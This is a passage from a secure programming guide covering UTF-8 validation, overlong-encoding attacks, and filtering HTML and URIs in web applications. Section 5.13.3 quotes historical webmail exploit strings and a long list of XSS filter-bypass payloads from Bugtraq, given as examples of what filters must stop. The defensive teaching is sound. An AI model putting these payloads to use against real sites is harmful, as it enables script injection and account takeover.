locale pattern, you can use this pattern instead:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> ^[A-Za-z]+(_[A-Za-z]+)?
 (\.[A-Z]+(\-[A-Z0-9]+)*)?
 (\@[A-Za-z0-9]+(\=[A-Za-z0-9\-]+)
  (,[A-Za-z0-9]+(\=[A-Za-z0-9\-]+))*)?$</PRE
></FONT
></TD
></TR
></TABLE
>
In both cases, these patterns use POSIX&#8217;s extended (<SPAN
CLASS="QUOTE"
>&#8220;modern&#8221;</SPAN
>)
regular expression notation (see regex(3) and regex(7) on Unix-like systems).</P
><P
>Of course, languages cannot be supported without a
standard way to represent their written symbols, which brings
us to the issue of character encoding.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CHARACTER-ENCODING"
>5.11. Character Encoding</A
></H2
><DIV
CLASS="SECT2"
><H3
CLASS="SECT2"
><A
NAME="CHARACTER-ENCODING-INTRO"
>5.11.1. Introduction to Character Encoding</A
></H3
><P
>For many years Americans have exchanged text using the ASCII character set;
since essentially all U.S. systems support ASCII,
this permits easy exchange of English text.
Unfortunately, ASCII is completely inadequate in handling the characters
of nearly all other languages.
For many years different countries have adopted different techniques for
exchanging text in different languages, making it difficult to exchange
data in an increasingly interconnected world.</P
><P
>More recently, ISO has developed ISO 10646,
the <SPAN
CLASS="QUOTE"
>&#8220;Universal Mulitple-Octet Coded Character Set (UCS)&#8221;</SPAN
>.
UCS is a coded character set which
defines a single 31-bit value for each of all of the world&#8217;s characters.
The first 65536 characters of the UCS (which thus fit into 16 bits)
are termed the <SPAN
CLASS="QUOTE"
>&#8220;Basic Multilingual Plane&#8221;</SPAN
> (BMP),
and the BMP is intended to cover nearly all of today&#8217;s spoken languages.
The Unicode forum develops the Unicode standard, which concentrates on
the UCS and adds some additional conventions to aid interoperability.
Historically, Unicode and ISO 10646 were developed by competing groups,
but thankfully they realized that they needed to work together and they now
coordinate with each other.</P
><P
>If you&#8217;re writing new software that handles internationalized characters,
you should be using ISO 10646/Unicode as your basis for handling
international characters.
However, you may need to process older documents in various older
(language-specific) character sets, in which case, you need to ensure that
an untrusted user cannot control the setting of another document&#8217;s
character set (since this would significantly affect the document&#8217;s
interpretation).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="CHARACTER-ENCODING-UTF8"
>5.11.2. Introduction to UTF-8</A
></H3
><P
>Most software is not designed to handle 16 bit or 32 bit characters,
yet to create a universal character set more than 8 bits was required.
Therefore, a special format called <EM
>UTF-8</EM
>
was developed to encode these
potentially international
characters in a format more easily handled by existing programs and libraries.
UTF-8 is defined, among other places, in IETF RFC 3629 (updating RFC 2279),
so it&#8217;s a
well-defined standard that can be freely read and used.
UTF-8 is a variable-width encoding; characters numbered 0 to 0x7f (127)
encode to themselves as a single byte,
while characters with larger values are encoded into 2 to 4 (originally 6)
bytes of information (depending on their value).
The encoding has been specially designed to have the following
nice properties (this information is from the RFC and Linux utf-8 man page):

<P
></P
><UL
><LI
><P
>       The classical US ASCII characters (0 to 0x7f) encode as themselves,
       so files  and strings  which  contain only 7-bit ASCII characters
       have the same encoding under both ASCII and UTF-8.
       This is fabulous for backward compatibility with the many existing
       U.S. programs and data files.</P
></LI
><LI
><P
>       All UCS characters beyond 0x7f are  encoded  as  a  multibyte
       sequence  consisting  only of bytes in the range 0x80 to 0xfd.
       This means that no ASCII byte can appear  as  part  of  another
       character.  Many other encodings permit characters such as an
       embedded NIL, causing programs to fail.</P
></LI
><LI
><P
>       It&#8217;s easy to convert between UTF-8 and a 2-byte or 4-byte
       fixed-width representations of characters (these are called
       UCS-2 and UCS-4 respectively).</P
></LI
><LI
><P
>       The lexicographic sorting order of UCS-4 strings is preserved,
       and the Boyer-Moore fast search algorithm can be used directly
       with UTF-8 data.</P
></LI
><LI
><P
>       All  possible 2^31 UCS codes can be encoded using UTF-8.</P
></LI
><LI
><P
>       The  first byte of a multibyte sequence which represents
       a single non-ASCII UCS character is always in the  range
       0xc0  to  0xfd  and  indicates  how  long this multibyte
       sequence is. All further bytes in a  multibyte  sequence
       are  in  the range 0x80 to 0xbf. This allows easy resynchronization;
       if a byte is missing, it&#8217;s easy to skip forward to the <SPAN
CLASS="QUOTE"
>&#8220;next&#8221;</SPAN
>
       character, and it&#8217;s always easy to skip forward and back to the
       <SPAN
CLASS="QUOTE"
>&#8220;next&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;preceding&#8221;</SPAN
> character.</P
></LI
></UL
></P
><P
>In short, the UTF-8 transformation format is becoming a dominant method
for exchanging international text information because it can support all of the
world&#8217;s languages, yet it is backward compatible with U.S. ASCII files
as well as having other nice properties.
For many purposes I recommend its use, particularly when storing data
in a <SPAN
CLASS="QUOTE"
>&#8220;text&#8221;</SPAN
> file.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="UTF8-SECURITY-ISSUES"
>5.11.3. UTF-8 Security Issues</A
></H3
><P
>The reason to mention UTF-8 is that
some byte sequences are not legal UTF-8, and
this might be an exploitable security hole.
UTF-8 encoders are supposed to use the <SPAN
CLASS="QUOTE"
>&#8220;shortest possible&#8221;</SPAN
>
encoding, but naive decoders may accept encodings that are longer than
necessary.
Indeed, earlier standards permitted decoders to accept
<SPAN
CLASS="QUOTE"
>&#8220;non-shortest form&#8221;</SPAN
> encodings.
The problem here is that this means that potentially dangerous
input could be represented multiple ways, and thus might
defeat the security routines checking for dangerous inputs.
The RFC describes the problem this way:

<A
NAME="AEN1315"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>Implementers of UTF-8 need to consider the security aspects of how
they handle illegal UTF-8 sequences.  It is conceivable that in some
circumstances an attacker would be able to exploit an incautious
UTF-8 parser by sending it an octet sequence that is not permitted by
the UTF-8 syntax.</P
><P
>A particularly subtle form of this attack could be carried out
against a parser which performs security-critical validity checks
against the UTF-8 encoded form of its input, but interprets certain
illegal octet sequences as characters.  For example, a parser might
prohibit the NUL character when encoded as the single-octet sequence
00, but allow the illegal two-octet sequence C0 80 (illegal because
it&#8217;s longer than necessary) and interpret it
as a NUL character (00).  Another example might be a parser which
prohibits the octet sequence 2F 2E 2E 2F ("/../"), yet permits the
illegal octet sequence 2F C0 AE 2E 2F.</P
></BLOCKQUOTE
>&#13;</P
><P
>A longer discussion about this is available at
Markus Kuhn&#8217;s
<EM
>UTF-8 and Unicode FAQ for Unix/Linux</EM
> at
<A
HREF="http://www.cl.cam.ac.uk/~mgk25/unicode.html"
TARGET="_top"
>http://www.cl.cam.ac.uk/~mgk25/unicode.html</A
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="UTF8-LEGAL-VALUES"
>5.11.4. UTF-8 Legal Values</A
></H3
><P
>Thus, when accepting UTF-8 input, you need to check if the input is
valid UTF-8.
Here is a list of all legal UTF-8 sequences; any character
sequence not matching this table is not a legal UTF-8 sequence.
This list is from
<A
HREF="http://www.unicode.org/versions/Unicode7.0.0/ch03.pdf"
TARGET="_top"
>The Unicode Standard Version 7.0 - Core Specification (2014)</A
>.
In the following table, the first column shows the various character
values being encoded into UTF-8.
The second column shows how those characters are encoded as binary values;
an <SPAN
CLASS="QUOTE"
>&#8220;x&#8221;</SPAN
> indicates where the data is placed (either a 0 or 1), though
some values should not be allowed because they&#8217;re not the shortest possible
encoding.
The last row shows the valid values each byte can have
(in hexadecimal).
Thus, a program should check that every character meets one of the patterns
in the right-hand column.
A <SPAN
CLASS="QUOTE"
>&#8220;-&#8221;</SPAN
> indicates a range of legal values (inclusive).
Of course, just because a sequence is a legal UTF-8 sequence doesn&#8217;t
mean that you should accept it (you still need to do all your other
checking), but generally you should check any UTF-8 data for UTF-8 legality
before performing other checks.
<DIV
CLASS="TABLE"
><A
NAME="AEN1327"
></A
><P
><B
>Table 5-1. Legal UTF-8 Sequences</B
></P
><TABLE
BORDER="1"
CLASS="CALSTABLE"
><COL
WIDTH="1*"
TITLE="UCS"><COL
WIDTH="1*"
TITLE="binary-range"><COL
WIDTH="1*"
TITLE="hex"><THEAD
><TR
><TH
>UCS Code (Hex)</TH
><TH
>Binary UTF-8 Format</TH
><TH
>Legal UTF-8 Values (Hex)</TH
></TR
></THEAD
><TBODY
><TR
><TD
>00-7F</TD
><TD
>0xxxxxxx</TD
><TD
>00-7F</TD
></TR
><TR
><TD
>80-7FF</TD
><TD
>110xxxxx 10xxxxxx</TD
><TD
>C2-DF 80-BF</TD
></TR
><TR
><TD
>800-FFF</TD
><TD
>1110xxxx 10xxxxxx 10xxxxxx</TD
><TD
>E0 A0-BF 80-BF</TD
></TR
><TR
><TD
>1000-CFFF</TD
><TD
>1110xxxx 10xxxxxx 10xxxxxx</TD
><TD
>E1-EC 80-BF 80-BF</TD
></TR
><TR
><TD
>D000-D7FF</TD
><TD
>1110xxxx 10xxxxxx 10xxxxxx</TD
><TD
>ED 80-9F 80-BF</TD
></TR
><TR
><TD
>E000-FFFF</TD
><TD
>1110xxxx 10xxxxxx 10xxxxxx</TD
><TD
>EE-EF 80-BF 80-BF</TD
></TR
><TR
><TD
>10000-3FFFF</TD
><TD
>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</TD
><TD
>F0 90-BF 80-BF 80-BF</TD
></TR
><TR
><TD
>40000-FFFFF</TD
><TD
>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</TD
><TD
>F1-F3 80-BF 80-BF 80-BF</TD
></TR
><TR
><TD
>100000-10FFFF</TD
><TD
>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</TD
><TD
>F4 80-8F 80-BF 80-BF</TD
></TR
></TBODY
></TABLE
></DIV
></P
><P
>As I noted earlier, there are two standards for character sets,
ISO 10646 and Unicode, who have agreed to synchronize their
character assignments.
The earlier definitions of UTF-8 in ISO/IEC 10646-1:2000 and the IETF RFC
also supported
five and six byte sequences to encode characters beyond U+10FFFF,
but such values can&#8217;t be used to support Unicode characters.
IETF RFC 3629 modified the UTF-8 definition, and one of the changes
was to specifically make any encodings beyond 4 bytes illegal
(i.e., characters must be between U+0000 and U+10FFFF inclusively).
Thus, the five and six byte UTF-8 encodings for characters
beyon U+10FFFF aren&#8217;t legal any more,
and you should normally reject them (unless you have a special purpose
for them).</P
><P
>This is set of valid values is tricky to determine, and in fact
earlier versions of this document got some entries
wrong (in some cases it permitted overlong characters).
Language developers should include a function in their libraries
to check for valid UTF-8 values, just because it&#8217;s so hard to get right.</P
><P
>I should note that in some cases, you might want to cut slack (or use
internally) the hexadecimal sequence C0 80.  This is an overlong sequence
that, if permitted, can represent ASCII NUL (NIL).  Since C and C++
have trouble including a NIL character in an ordinary string,
some people have taken
to using this sequence when they want to represent NIL as part of the
data stream; Java even enshrines the practice.
Feel free to use C0 80 internally while processing data, but technically
you really should translate this back to 00 before saving the data.
Depending on your needs, you might decide to be <SPAN
CLASS="QUOTE"
>&#8220;sloppy&#8221;</SPAN
> and accept
C0 80 as input in a UTF-8 data stream.
If it doesn&#8217;t harm security, it&#8217;s probably a good practice to accept this
sequence since accepting it aids interoperability.</P
><P
>Handling this can be tricky.
You might want to examine the C routines developed by Unicode to
handle conversions, available at
<A
HREF="ftp://ftp.unicode.org/Public/PROGRAMS/CVTUTF/ConvertUTF.c"
TARGET="_top"
>ftp://ftp.unicode.org/Public/PROGRAMS/CVTUTF/ConvertUTF.c</A
>.
It&#8217;s unclear to me if these routines are open source software (the
licenses don&#8217;t clearly say whether or not they can be modified), so
beware of that.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="UTF8-RELATED-ISSUES"
>5.11.5. UTF-8 Related Issues</A
></H3
><P
>This section has discussed UTF-8, because it&#8217;s the most popular
multibyte encoding of UCS, simplifying a lot of international text
handling issues.
However, it&#8217;s certainly not the only encoding; there are other encodings,
such as UTF-16 and UTF-7, which have the same kinds of issues and
must be validated for the same reasons.</P
><P
>Another issue is that some phrases can be expressed in more than one
way in ISO 10646/Unicode.
For example, some accented characters can be represented as a single
character (with the accent) and also as a set of characters
(e.g., the base character plus a separate composing accent).
These two forms may appear identical.
There&#8217;s also a zero-width space that could be inserted, with the
result that apparently-similar items are considered different.
Beware of situations where such hidden text could interfere with the program.
This is an issue that in general is hard to solve; most programs don&#8217;t
have such tight control over the clients that they know completely how
a particular sequence will be displayed (since this depends on the
client&#8217;s font, display characteristics, locale, and so on).
One approach is to require clients to send data in a normalized form,
and if you don&#8217;t trust the clients, force their data into that form.
The W3C recommends
Normalization Form C in their draft document
<A
HREF="http://www.w3.org/TR/charmod/#sec-ChoiceNFC"
TARGET="_top"
>Character Model for the World Wide Web</A
>.
Normalization form C is a good approach, because it&#8217;s what nearly all
programs do anyway, and it&#8217;s slightly more efficient in space.
See the W3C document for more information.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="INPUT-PROTECTION-CROSS-SITE"
>5.12. Prevent Cross-site Malicious Content on Input</A
></H2
><P
>Some programs accept data from one untrusted user and pass that data
on to a second user; the second user&#8217;s application may then process that
data in a way harmful to the second user.
This is a particularly common problem for web applications,
we&#8217;ll call this problem <SPAN
CLASS="QUOTE"
>&#8220;cross-site malicious content.&#8221;</SPAN
>
In short, you cannot accept input (including any form data)
without checking, filtering, or encoding it.
For more information, see
<A
HREF="#CROSS-SITE-MALICIOUS-CONTENT"
>Section 7.16</A
>.</P
><P
>Fundamentally, this means that all web application input must be
filtered (so characters that can cause this problem are removed),
encoded (so the characters that can cause this problem are encoded in
a way to prevent the problem), or
validated (to ensure that only <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> data gets through).
Filtering and validation should often be done at the input, but
encoding can be done either at input or output time.
If you&#8217;re just passing the data through without analysis, it&#8217;s probably
better to encode the data on input (so it won&#8217;t be forgotten), but
if you&#8217;re processing the data, there are arguments for encoding on
output instead.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FILTER-HTML"
>5.13. Filter HTML/URIs That May Be Re-presented</A
></H2
><P
>One special case where cross-site malicious content must be
prevented are web applications
which are designed to accept HTML or XHTML from one user, and then send it on
to other users
(see <A
HREF="#CROSS-SITE-MALICIOUS-CONTENT"
>Section 7.16</A
> for
more information on cross-site malicious content).
The following subsections discuss filtering this specific kind of input,
since handling it is such a common requirement.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="REMOVE-HTML-TAGS"
>5.13.1. Remove or Forbid Some HTML Data</A
></H3
><P
>It&#8217;s safest to remove all possible (X)HTML tags so they cannot affect anything,
and this is relatively easy to do.
As noted above, you should already be identifying the list of legal
characters, and rejecting or removing those characters that aren&#8217;t
in the list.
In this filter, simply don&#8217;t include the following characters in
the list of legal characters: <SPAN
CLASS="QUOTE"
>&#8220;&#60;&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;&#62;&#8221;</SPAN
>, and <SPAN
CLASS="QUOTE"
>&#8220;&#38;&#8221;</SPAN
> (and if
they&#8217;re used in attributes, the double-quote character <SPAN
CLASS="QUOTE"
>&#8220;"&#8221;</SPAN
>).
If browsers only operated according the HTML specifications, the <SPAN
CLASS="QUOTE"
>&#8220;&#62;"&#8221;</SPAN
>
wouldn&#8217;t need to be removed, but in practice it must be removed.
This is because some browsers assume that the author of the page
really meant to put in an opening "&#60;" and <SPAN
CLASS="QUOTE"
>&#8220;helpfully&#8221;</SPAN
> insert one -
attackers can exploit this behavior and use the "&#62;" to create an
undesired "&#60;".</P
><P
>Usually the character set for transmitting HTML is
ISO-8859-1 (even when sending international text),
so the filter should also omit most control characters (linefeed and
tab are usually okay) and characters with their high-order bit set.</P
><P
>One problem with this approach is that it can really surprise users,
especially those entering international text if all international
text is quietly removed.
If the invalid characters are quietly removed without warning,
that data will be irrevocably lost and cannot be reconstructed later.
One alternative is forbidding such characters and sending error messages
back to users who attempt to use them.
This at least warns users, but doesn&#8217;t give them the functionality
they were looking for.
Other alternatives are encoding this data or validating this data,
which are discussed next.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="ENCODING-HTML-TAGS"
>5.13.2. Encoding HTML Data</A
></H3
><P
>An alternative that is nearly as safe
is to transform the critical characters so they won&#8217;t
have their usual meaning in HTML.
This can be done by translating all "&#60;" into "&#38;lt;",
"&#62;" into "&#38;gt;", and "&#38;" into "&#38;amp;".
Arbitrary international characters can be encoded in Latin-1
using the format "&#38;#value;" - do not forget the ending semicolon.
Encoding the international characters means you must know what the
input encoding was, of course.</P
><P
>One possible danger here is that if these encodings are accidentally
interpreted twice, they will become a vulnerability.
However, this approach at least permits later users to see the
"intent" of the input.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="VALIDATING-HTML-TAGS"
>5.13.3. Validating HTML Data</A
></H3
><P
>Some applications, to work at all, must accept HTML from third parties
and send them on to their users.
Beware - you are treading dangerous ground at this point; be sure
that you really want to do this.
Even the idea of accepting HTML from arbitrary places
is controversial among some security practitioners, because it is extremely
difficult to get it right.</P
><P
>However, if your application must accept HTML, and you believe
that it&#8217;s worth the risk, at least identify a list
of <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> HTML commands and only permit those commands.</P
><P
>Here is a minimal set of safe HTML tags
that might be useful for applications (such as guestbooks)
that support short comments:
&#60;p&#62; (paragraph),
&#60;b&#62; (bold),
&#60;i&#62; (italics),
&#60;em&#62; (emphasis),
&#60;strong&#62; (strong emphasis),
&#60;pre&#62; (preformatted text),
&#60;br&#62; (forced line break - note it doesn&#8217;t require a closing tag),
as well as all their ending tags.</P
><P
>Not only do you need to ensure that only a small set
of <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> HTML commands are accepted, you also need to ensure
that they are properly nested and closed
(i.e., that the HTML commands are <SPAN
CLASS="QUOTE"
>&#8220;balanced&#8221;</SPAN
>).
In XML, this is termed <SPAN
CLASS="QUOTE"
>&#8220;well-formed&#8221;</SPAN
> data.
A few exceptions could be made if you&#8217;re accepting standard HTML
(e.g., supporting an implied &#60;/p&#62; where not provided before a
&#60;p&#62; would be fine), but trying to accept HTML in its full
generality (which can infer balancing closing tags in many cases)
is not needed for most applications.
Indeed, if you&#8217;re trying to stick to XHTML (instead of HTML), then
well-formedness is a requirement.
Also, HTML tags are case-insensitive; tags can be upper case,
lower case, or a mixture.
However, if you intend to accept XHTML
then you need to require all tags to be in lower case
(XML is case-sensitive; XHTML uses XML and requires the tags to be
in lower case).</P
><P
>Here are a few random tips about doing this.
Usually you should design whatever surrounds the HTML text and the
set of permitted tags so that the contributed text cannot be misinterpreted
as text from the <SPAN
CLASS="QUOTE"
>&#8220;main&#8221;</SPAN
> site (to prevent forgeries).
Don&#8217;t accept any attributes unless you&#8217;ve checked the attribute type and
its value; there are many attributes that support things such as
Javascript that can cause trouble for your users.
You&#8217;ll notice that in the above list I didn&#8217;t include any attributes at all,
which is certainly the safest course.
You should probably give a warning message if an unsafe tag is used,
but if that&#8217;s not practical, encoding the critical characters
(e.g., "&#60;" becomes "&#38;lt;") prevents data loss while
simultaneously keeping the users safe.</P
><P
>Be careful when expanding this set, and in general be restrictive of
what you accept.
If your patterns are too generous, the browser may interpret the
sequences differently than you expect, resulting in a potential
exploit.
For example, FozZy posted on Bugtraq (1 April 2002)
some sequences that permitted
exploitation in various web-based mail systems,
which may give you an idea of the kinds of problems you need to defend
against.
Here&#8217;s some exploit text that, at one time, could
subvert user accounts in Microsoft Hotmail:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>   &#60;SCRIPT&#62;
   &#60;/COMMENT&#62;
   &#60;!-- --&#62; --&#62;</PRE
></FONT
></TD
></TR
></TABLE
>
Here&#8217;s some similar exploit text for Yahoo! Mail:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  &#60;_a&#60;script&#62;
  &#60;&#60;script&#62;        (Note: this was found by BugSan)</PRE
></FONT
></TD
></TR
></TABLE
>
Here&#8217;s some exploit text for Vizzavi:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  &#60;b onmousover="..."&#62;go here&#60;/b&#62;
  &#60;img [line_break] src="javascript:alert(document.location)"&#62;</PRE
></FONT
></TD
></TR
></TABLE
>

Andrew Clover posted to Bugtraq (on May 11, 2002) a list of various
text that invokes Javascript yet manages to bypass many filters.
Here are his examples (which he says he cut and pasted from elsewhere);
some only apply to specific browsers
(IE means Internet Explorer, N4 means Netscape version 4).
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  &#60;a href="javas&#38;#99;ript&#38;#35;[code]"&#62;
  &#60;div onmouseover="[code]"&#62;
  &#60;img src="javascript:[code]"&#62;
  &#60;img dynsrc="javascript:[code]"&#62; [IE]
  &#60;input type="image" dynsrc="javascript:[code]"&#62; [IE]
  &#60;bgsound src="javascript:[code]"&#62; [IE]
  &#38;&#60;script&#62;[code]&#60;/script&#62;
  &#38;{[code]}; [N4]
  &#60;img src=&#38;{[code]};&#62; [N4]
  &#60;link rel="stylesheet" href="javascript:[code]"&#62;
  &#60;iframe src="vbscript:[code]"&#62; [IE]
  &#60;img src="mocha:[code]"&#62; [N4]
  &#60;img src="livescript:[code]"&#62; [N4]
  &#60;a href="about:&#60;s&#38;#99;ript&#62;[code]&#60;/script&#62;"&#62;
  &#60;meta http-equiv="refresh" content="0;url=javascript:[code]"&#62;
  &#60;body onload="[code]"&#62;
  &#60;div style="background-image: url(javascript:[code]);"&#62;
  &#60;div style="behaviour: url([link to code]);"&#62; [IE]
  &#60;div style="binding: url([link to code]);"&#62; [Mozilla]
  &#60;div style="width: expression([code]);"&#62; [IE]
  &#60;style type="text/javascript"&#62;[code]&#60;/style&#62; [N4]
  &#60;object classid="clsid:..." codebase="javascript:[code]"&#62; [IE]
  &#60;style&#62;&#60;!--&#60;/style&#62;&#60;script&#62;[code]//--&#62;&#60;/script&#62;
  &#60;!-- -- --&#62;&#60;script&#62;[code]&#60;/script&#62;&#60;!-- -- --&#62;
  &#60;&#60;script&#62;[code]&#60;/script&#62;
  &#60;img src="blah"onmouseover="[code]"&#62;
  &#60;img src="blah&#62;" onmouseover="[code]"&#62;
  &#60;xml src="javascript:[code]"&#62;
  &#60;xml id="X"&#62;&#60;a&#62;&#60;b&#62;&#38;lt;script&#62;[code]&#38;lt;/script&#62;;&#60;/b&#62;&#60;/a&#62;&#60;/xml&#62;
    &#60;div datafld="b" dataformatas="html" datasrc="#X"&#62;&#60;/div&#62;
  [\xC0][\xBC]script&#62;[code][\xC0][\xBC]/script&#62; [UTF-8; IE, Opera]
  &#60;![CDATA[&#60;!--]] &#62;&#60;script&#62;[code]//--&#62;&#60;/script&#62;&#13;</PRE
></FONT
></TD
></TR
></TABLE
>
This is not a complete list, of course, but it at least is a sample
of the kinds of attacks that you must prevent by strictly limiting the
tags and attributes you can allow from untrusted users.</P
><P
>Konstantin Riabitsev has posted
<A
HREF="http://www.mricon.com/html/phpfilter.html"
TARGET="_top"
>some PHP code to filter HTML</A
> (GPL);
I&#8217;ve not examined it closely, but you might want to take a look.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="VALIDATING-URIS"
>5.13.4. Validating Hypertext Links (URIs/URLs)</A
></H3
><P
>Careful readers will notice that I did not include the hypertext link tag
&#60;a&#62; as a safe tag in HTML.
Clearly, you could add
&#60;a href="safe URI"&#62; (hypertext link) to the safe list
(not permitting any other attributes unless you&#8217;ve checked their
contents).
If your application requires it, then do so.
However, permitting third parties to create links
is much less safe, because defining a <SPAN
CLASS="QUOTE"
>&#8220;safe URI&#8221;</SPAN
><A
NAME="AEN1435"
HREF="#FTN.AEN1435"
><SPAN
CLASS="footnote"
>[1]</SPAN
></A
>
turns out to be very difficult.
Many browsers accept
all sorts of URIs which may be dangerous to the user.
This section discusses how to validate URIs from third parties for
re-presenting to others, including URIs incorporated into HTML.</P
><P
>First, there&#8217;s the problem that URLs -- while not necessarily dangerous
per se -- reference spam sites, and as a result, some organizations
work hard to insert links to their own sites to increase their search rankings.
You need to remove the incentive for strangers to insert worthless
links their site.
Thus, if you allow arbitrary users to insert information that creates
links (like a blog or comment form),
then you should implement the approach described by
<A
HREF="http://www.google.com/googleblog/2005/01/preventing-comment-spam.html"
TARGET="_top"
>Google&#8217;s "Preventing comment spam"</A
>.
Basically, add a rel="nofollow" to the hypertext link, so that it
looks like this: &#60;a href=".." rel="nofollow"&#62;.
That way, search engines will know that this link information was provided
by a third party and shouldn&#8217;t be followed for search ranking purposes.</P
><P
>First, let&#8217;s look briefly at URI syntax (as defined by various specifications).
URIs can be either <SPAN
CLASS="QUOTE"
>&#8220;absolute&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;relative&#8221;</SPAN
>.
The syntax of an absolute URI looks like this:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>scheme://authority[path][?query][#fragment]</PRE
></FONT
></TD
></TR
></TABLE
>
A URI starts with a scheme name (such as <SPAN
CLASS="QUOTE"
>&#8220;http&#8221;</SPAN
>), the characters <SPAN
CLASS="QUOTE"
>&#8220;://&#8221;</SPAN
>,
the authority (such as <SPAN
CLASS="QUOTE"
>&#8220;www.dwheeler.com&#8221;</SPAN
>), a path
(which looks like a directory or file name), a question mark followed by
a query, and a hash (<SPAN
CLASS="QUOTE"
>&#8220;#&#8221;</SPAN
>) followed by a fragment identifier.
The square brackets surround optional portions - e.g., many URIs don&#8217;t
actually include the query or fragment.
Some schemes may not permit some of the data (e.g., paths, queries, or
fragments), and many schemes have additional requirements unique to them.
Many schemes permit the <SPAN
CLASS="QUOTE"
>&#8220;authority&#8221;</SPAN
> field to identify
optional usernames, passwords, and ports, using this syntax for the
<SPAN
CLASS="QUOTE"
>&#8220;authority&#8221;</SPAN
> section:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> [username[:password]@]host[:portnumber]</PRE
></FONT
></TD
></TR
></TABLE
>
The <SPAN
CLASS="QUOTE"
>&#8220;host&#8221;</SPAN
> can either be a name (<SPAN
CLASS="QUOTE"
>&#8220;www.dwheeler.com&#8221;</SPAN
>) or an IPv4
numeric address (127.0.0.1).
A <SPAN
CLASS="QUOTE"
>&#8220;relative&#8221;</SPAN
> URI references one object relative to the <SPAN
CLASS="QUOTE"
>&#8220;current&#8221;</SPAN
> one,
and its syntax looks a lot like a filename:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>path[?query][#fragment]</PRE
></FONT
></TD
></TR
></TABLE
>
There are a limited number of characters permitted in most of the URI,
so to get around this problem, other 8-bit characters may be <SPAN
CLASS="QUOTE"
>&#8220;URL encoded&#8221;</SPAN
>
as %hh (where hh is the hexadecimal value of the 8-bit character).
For more detailed information on valid URIs, see IETF RFC 2396 and its
related specifications.</P
><P
>Now that we've looked at the syntax of URIs, let&#8217;s examine the risks
of each part:
<P
></P
><UL
><LI
><P
>Scheme:
Many schemes are downright dangerous.
Permitting someone to insert a <SPAN
CLASS="QUOTE"
>&#8220;javascript&#8221;</SPAN
> scheme into your material
would allow them to trivially mount denial-of-service attacks
(e.g., by repeatedly creating windows so the user&#8217;s machine freezes or
becomes unusable).
More seriously, they might be able to exploit a known vulnerability in
the javascript implementation.
Some schemes can be a nuisance, such as <SPAN
CLASS="QUOTE"
>&#8220;mailto:&#8221;</SPAN
> when a mailing
is not expected, and some schemes may not be sufficiently secure
on the client machine.
Thus, it&#8217;s necessary to limit the set of allowed schemes to
just a few safe schemes.</P
></LI
><LI
><P
>Authority:
Ideally, you should limit user links to <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> sites, but this is
difficult to do in practice.
However, you can certainly do something about usernames, passwords,
and port numbers: you should forbid them.
Systems expecting usernames (especially with passwords!) are probably
guarding more important material;
rarely is this needed in publicly-posted URIs, and someone could try
to use this functionality to convince users
to expose information they have access to and/or
use it to modify the information.
Such URIs permit semantic attacks; see
<A
HREF="#SEMANTIC-ATTACKS"
>Section 7.17</A
>
for more information.
Usernames without passwords are no less dangerous, since browsers typically
cache the passwords.
You should not usually permit specification of ports, because
different ports expect different protocols and the resulting
<SPAN
CLASS="QUOTE"
>&#8220;protocol confusion&#8221;</SPAN
> can produce an exploit.
For example, on some systems it&#8217;s possible to use the <SPAN
CLASS="QUOTE"
>&#8220;gopher&#8221;</SPAN
> scheme
and specify the SMTP (email) port to cause a user to send email of the
attacker&#8217;s choosing.
You might permit a few special cases (e.g., http ports 8008 and 8080),
but on the whole it&#8217;s not worth it.
The host when specified by name actually has a fairly limited character set
(using the DNS standards).
Technically, the standard doesn&#8217;t permit the underscore (<SPAN
CLASS="QUOTE"
>&#8220;_&#8221;</SPAN
>) character,
